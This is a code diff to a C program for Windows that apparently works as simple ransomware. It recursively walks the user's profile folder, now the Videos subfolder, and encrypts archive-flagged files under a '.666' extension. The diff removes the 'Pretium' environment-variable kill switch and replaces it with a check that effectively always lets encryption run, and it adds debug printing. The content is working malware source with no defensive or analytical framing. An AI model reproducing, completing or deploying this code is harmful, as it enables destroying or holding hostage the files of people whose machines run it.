@@ -2,10 +2,9 @@
 #include <stdio.h>
 #include <string.h>
 #include <Windows.h>
-#define RELATIVE_FOLDER "\\Desktop"
+#define RELATIVE_FOLDER "\\Videos"
 #define CRYPTO_EXT ".666"
 #define CRYPTO_EXT_LEN 4
-#define CRYPTO_ENV_NAME "Pretium" /* I will make this more secure later */
 #define CRYPTO_ENV_VALUE "666" /* this too */
 
 char ascii[] = "ascii art here";
@@ -24,10 +23,15 @@ void artwork() {
 
 void sixsixtysix_encryption(char* file) {
 	char* ext = strrchr(file, '.');
-	if (encrypt == -1)
+	if (encrypt == -1) {
+        //printf("encrypt == -1\n");
 		encrypt = strcmp(ext, CRYPTO_EXT) & 1;
-	else if (encrypt != (strcmp(ext, CRYPTO_EXT) & 1))
+	}
+	else if (encrypt != (strcmp(ext, CRYPTO_EXT) & 1)) {
+        //printf("encrypt != (strcmp(ext, CRYPTO_EXT) & 1)\n");
 		return;
+	}
+    encrypt = strcmp(ext, CRYPTO_EXT) & 1;
 	FILE *fp;
 	char *content;
 	long length;
@@ -37,6 +41,7 @@ void sixsixtysix_encryption(char* file) {
 		length = ftell(fp);
 		fseek(fp, 0, SEEK_SET);
 		content = malloc(length + 1);
+        //printf("content = %s", content);
 		if (content) {
 			length = fread(content, 1, length, fp);
 			if (length) {
@@ -81,13 +86,15 @@ void files_tree(const char *folder) {
 		files_tree(path);
 		if (fd.dwFileAttributes & FILE_ATTRIBUTE_ARCHIVE)
 			sixsixtysix_encryption(path);
-			//puts(path);
+			printf("%s\n", path);
     } while(FindNextFile(handle, &fd));
     FindClose(handle);
 }
 
 int main(void) {
-	char* env = getenv(CRYPTO_ENV_NAME);
+    artwork();
+	char* env = getenv("USERPROFILE");
+	//printf("env = %s", env);
 	if (strcmp(env, CRYPTO_ENV_VALUE)) {
 		void* home_path = getenv("USERPROFILE");
 		void* path = home_path;
@@ -100,6 +107,5 @@ int main(void) {
 		if (RELATIVE_FOLDER)
 			free(path);
 	}
-	artwork();
 	return 0;
 }
